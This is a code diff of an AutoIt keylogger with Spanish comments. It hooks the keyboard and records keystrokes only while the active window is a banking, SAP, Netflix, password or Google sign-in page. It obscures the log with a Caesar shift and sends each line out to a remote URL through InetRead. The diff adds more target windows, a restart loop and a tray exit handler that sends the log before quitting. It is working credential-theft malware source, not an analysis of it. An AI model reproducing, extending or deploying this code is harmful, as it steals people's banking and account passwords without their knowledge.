@@ -5,6 +5,18 @@
 
 
 Opt('MustDeclareVars', 1)
+; Asociar una función a la acción "Salir"
+TrayItemSetOnEvent(-1, "Salir")
+
+; Función que se ejecuta al hacer clic en "Salir"
+Func Salir()
+	write_file()
+	send_file(true)
+    MsgBox($MB_ICONINFORMATION, "Mensaje", "Se ha hecho clic en Salir")
+    Exit
+EndFunc
+
+
 
 Global $hHook, $hStub_KeyProc, $buf = "", $title = "", $title_1 = "", $keycode, $buffer = "", $nMsg
 Global $file, $f3 = 0
@@ -13,7 +25,9 @@ Global $lastActiveWindow = "", $lastActiveTime = 0
 Global $file_name = @computername & "_log.txt"
 Global $last_send = 0
 
- 	_Main()
+While 1
+	_Main()
+WEnd
 
 
 Func _Main()
@@ -27,7 +41,7 @@ Func _Main()
 	$last_send = TimerInit()
 	
 	send_file(true)
-	
+	debug_info()
     While 1
         Sleep(10)
         ; Comprobar si la ventana activa ha cambiado
@@ -68,6 +82,7 @@ Func send_file($forced_action)
             Local $aArray = FileReadToArray($file_name)
             For $i = 0 To UBound($aArray) - 1
                 InetRead($url & $aArray[$i], $INET_FORCERELOAD)
+				debug_info()
             Next
             ; Vaciar el contenido del archivo en lugar de eliminarlo
             $file = FileOpen($file_name, $FO_OVERWRITE)
@@ -80,15 +95,35 @@ EndFunc
 Func EvaluateKey($keycode)
     $title = WinGetTitle("")
     $buffer = key($keycode)
-    
-    If $title = "Netflix" Or $title = "BRP(1)/000 SAP" Or $title = "SAP" Or Stringleft($title , 6) = "Balanz" Or Stringleft($title , 14) = "Online Banking" or Stringleft($title , 7) = "Desprot" or Stringleft($title , 4) = "prot" or Stringleft($title , 8) = "Contrase" Then
+
+	Local $titles[9] = ["Netflix", "BRP(1)/000 SAP", "SAP", "Balanz", "Online Banking", "Desprot", "prot", "Contrase","Acceso: Cuentas de Google"]
+	Local $titleToCheck = Stringleft($title, 14) ; Ajusta la longitud según sea necesario para tu aplicación
+	Local $bFound = False
+
+	For $i = 0 To UBound($titles) - 1
+		If StringLeft($titleToCheck, StringLen($titles[$i])) = $titles[$i] Then
+			$bFound = True
+			ExitLoop
+		EndIf
+	Next
+
+	If $bFound Then
         If $title_1 <> $title Then
             $title_1 = $title
             $buffer = @CRLF & @CRLF & "====Title:" & $title_1 & "====Time:" & @YEAR & "." & @MON & "." & @MDAY & "--" & @HOUR & ":" & @MIN & ":" & @SEC & @CRLF & $buffer
        EndIf
 	   $buffer = CifrarDesplazamiento($buffer, 3)
 	   FileWrite($file, $buffer)
-	Endif
+	EndIf
+	
+EndFunc
+
+func debug_info()
+
+	ToolTip(@error, 100, 100)
+	Sleep(5000) ; Espera 5 segundos
+	ToolTip("") ; Oculta el mensaje contextual
+
 EndFunc
 
 Func key($keycode2)
